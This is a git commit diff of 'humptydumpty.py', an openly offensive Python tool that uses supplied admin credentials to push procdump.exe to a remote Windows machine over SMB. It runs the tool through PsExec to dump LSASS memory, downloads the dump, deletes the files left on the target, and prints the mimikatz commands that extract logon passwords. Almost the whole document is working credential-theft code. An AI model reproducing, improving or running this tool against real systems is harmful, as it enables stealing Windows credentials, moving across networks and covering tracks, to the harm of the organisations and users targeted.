2099a4094adb7b290c8f602abd31d092248c9824
n33dle <david_roccasalva@hotmail.com>
2019-09-22 11:28:23 +1000

    update

--- humptydumpty.py
+++ humptydumpty.py
@@ -1,28 +1,34 @@
 #!/usr/bin/env python3
 # Author: n33dle
-# Description: Dumps LSASS on target machines and downloads the dumpfiles for some offline mimikatz happyfuntimes
-# Version: 1 (WORK IN PROGRESS!)
-# Note: This code may suck. Any feedback/suggestions, let me know!
+# Description: Dumps LSASS on target machines and downloads the dumpfiles for some offline mimikatz. Not my idea, found this technique is quite popular, decided to make my own python tool
+# WORK IN PROGRESS!
+# Note: This code may suck.
 
 import subprocess
 import argparse
 from termcolor import colored
 from pypsexec.client import Client
 
-parser = argparse.ArgumentParser()
+parser = argparse.ArgumentParser(description="Dump lsass on remote machines for local processing!", 
+    add_help=True,
+    epilog="EXAMPLE: python3 humptydumpty.py -t 192.168.13.37 -u admin -p @dm1n")
 parser.add_argument("--target", "-t", help="Set the target", dest="target")
 parser.add_argument("--username", "-u", help="Set the target username", dest="username")
 parser.add_argument("--password", "-p", help="Set the target password", dest="password")
-#parser.add_argument("--domain", "-d", help="Set the target domain", dest="domain") needs work
+parser.add_argument("--domain", "-d", help="Set the target domain", dest="domain", default="") #needs work
+parser.add_argument("--output", "-o", help="Destination directory, default is current dir. Example: /dest/dir/", dest="output", default="")
+parser.add_argument("--version", action="version", version="0.1")
 args = parser.parse_args()
+
+print (colored("\nHumptyDumpty by }==[n33dle]>----", "white"))
 
 #upload procdump
 print (colored("\n[-] Sending ProcDump over SMB...", "yellow"))
 subprocess.call(["smbclient","//"+args.target+"/c$","-U"+args.username+"%"+args.password,"-c put procdump.exe"])
-print (colored("\n[+] Done", "green"))
+print (colored("[+] Done", "green"))
 
 #Dump creds
-print (colored("\n[-] Dumping Lsass.exe to file...", "yellow"))
+print (colored("[-] Dumping lsass to file (executing procdump)...", "yellow"))
 c = Client(args.target, username=args.username, password=args.password, encrypt=False)
 c.connect()
 try:
@@ -30,25 +36,25 @@ try:
  c.run_executable("cmd.exe","/c c:\procdump.exe -accepteula -64 -ma lsass.exe c:\humpty-" + args.target + ".dmp")
 finally:
  c.disconnect()
-print (colored("\n[+] Done", "green"))
+print (colored("[+] Done", "green"))
 
 #Download dump and cleanup
-print (colored("\n[-] Downloading the Lsass dumpfile and cleaning up...", "yellow"))
-#subprocess.call(["smbclient","//"+args.target+"/c$","-U"+args.username+"%"+args.password,"-c get hello.dmp;del hello.dmp;del procdump.exe"]) old
-subprocess.call(["smbclient","//"+args.target+"/c$","-U"+args.username+"%"+args.password,"-c get humpty-"+args.target+".dmp;del humpty-"+args.target+".dmp;del procdump.exe"])
-print (colored("\n[+] Done", "green"))
+print (colored("[-] Downloading the lsass dumpfile and cleaning up...", "yellow"))
+subprocess.call(["smbclient","//"+args.target+"/c$","-U"+args.username+"%"+args.password,"-c get humpty-"+args.target+".dmp "+args.output+"humpty-"+args.target+".dmp;del humpty-"+args.target+".dmp;del procdump.exe"])
 
-print (colored("\n[+] Complete! Now dump those creds\nRun the following:", "green"))
-print (colored("Mimikatz# sekurlsa::Minidump hello.dmp", "blue"))
+### FINISH ###
+print (colored("[+] Done - saved as: "+args.output+"humpty-"+args.target+".dmp", "green"))
+
+print (colored("[+] Complete! Now dump those creds\n\nRun the following:", "green"))
+print (colored("\nMimikatz# sekurlsa::Minidump humpty-"+args.target+".dmp", "blue"))
 print (colored("Mimikatz# sekurlsa::logonPasswords full", "blue"))
-	
+
 '''
 To do:
 - Set default as local auth and override with domain auth when -d selected
-- FFS! Fix passwords/usernames with non-alpha chars.
 - Allow target to be single IP or list of IPs from a file
 - Better error handling
-- Add arg for download locaiton (and set default as home drive?)
 - Automate mimikatz at the end, or prompt to run mimikatz or end script
 This is a test
 '''
+
